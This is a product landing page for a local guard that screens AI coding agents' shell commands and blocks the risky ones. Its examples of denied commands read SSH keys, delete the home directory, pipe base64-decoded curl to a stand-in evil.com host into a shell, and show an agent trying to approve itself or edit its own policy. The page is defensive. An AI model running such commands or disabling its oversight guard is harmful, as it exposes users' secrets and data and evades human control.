Let your agent run.
Keep your keys.

A local guard for Claude Code, Codex and Cursor. It checks every command before it runs and blocks the ones that would hurt you.

$ brew install crocodile-labs/tap/moat

Works with Claude Code · Codex · Cursor

Three answers. That's it.

Every tool call gets one. Same rules for every agent.

Allow

Normal work just runs.

  • git status
  • cargo test
  • npm test

Ask

You decide, and you're told why.

  • npm install left-pad
  • git push origin main

Deny

Blocked. The agent hears which rule.

  • cat ~/.ssh/id_rsa
  • git push --force
  • rm -rf ~

See the full default policy →

Sneaky commands don't sneak past.

Base64, nested shells, symlinks into your secrets. OpenMoat unpacks the command before it decides.

$ echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh
✗ deny  pipe-to-shell

$ ln -s ~/.ssh/id_rsa notes.txt && cat notes.txt
✗ deny  secrets-paths
$ allow  npm test

postinstall.js → read ~/.ssh/id_rsa
✗ stopped by OS sandbox
postinstall.js → connect evil.com
✗ refused by proxy

Even approved scripts stay in a box.

Clicking "yes" on npm test doesn't hand over your machine. The same policy sets up the OS sandbox and network.

Your agent can't switch it off.

It can't edit the rules, approve itself or disable the guard. If anything changes behind your back, everything stops until you look.

agent$ moat allow --last
✗ deny  kernel-self

agent$ vim .moat/policy.yaml
✗ deny  kernel-self
  • ~10 ms per check. You won't notice it.
  • 0 AI in the loop. Plain rules, same answer every time.
  • Local Nothing leaves your machine unless you export it.

We tell you what it can't do.

Every layer is attacked in CI on every pull request. Gaps get published, not buried.

  • Scripts you allow can still run whatever's inside them (the sandbox limits the damage).
  • Hosts you allow, like GitHub, can still receive data.
  • Some Cursor modes run commands outside the sandbox.
  • Tools without hooks, like web search, aren't seen.
